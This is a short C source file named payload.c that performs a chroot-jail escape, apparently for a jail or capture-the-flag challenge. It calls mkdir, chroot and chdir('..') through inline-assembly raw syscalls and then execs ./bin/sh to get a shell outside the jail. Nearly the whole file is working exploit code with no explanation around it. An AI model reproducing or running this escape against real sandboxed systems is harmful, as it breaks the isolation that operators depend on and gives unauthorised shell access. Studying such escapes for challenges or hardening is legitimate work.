// Compilation: musl-gcc -static payload.c -o payload

int syscall (long num, ...) {
    asm(
        "mov %rdi, %rax\n"
        "mov %rsi, %rdi\n"
        "mov %rdx, %rsi\n"
        "mov %rcx, %rdx\n"
        "mov %r8, %r10\n"
        "syscall\n"
    );
}

int main (void) {
    char* argv[] = {
        "./bin/sh", 
        0
    };
    
    /* mkdir("not-very-jaily") */
    if (syscall(83, "./not-very-jaily", 0777) < 0) {
        return 1;
    }
    
    /* chroot("not-very-jaily") */
    if (syscall(161, "./not-very-jaily") < 0) {
        return 1;
    }
    
    /* chdir(".."), chdir("..") */
    if (syscall(80, "..") < 0 || syscall(80, "..") < 0) {
        return 1;
    }
    
    /* exec("./bin/sh") */
    return syscall(59, argv[0], argv, 0) < 0;
}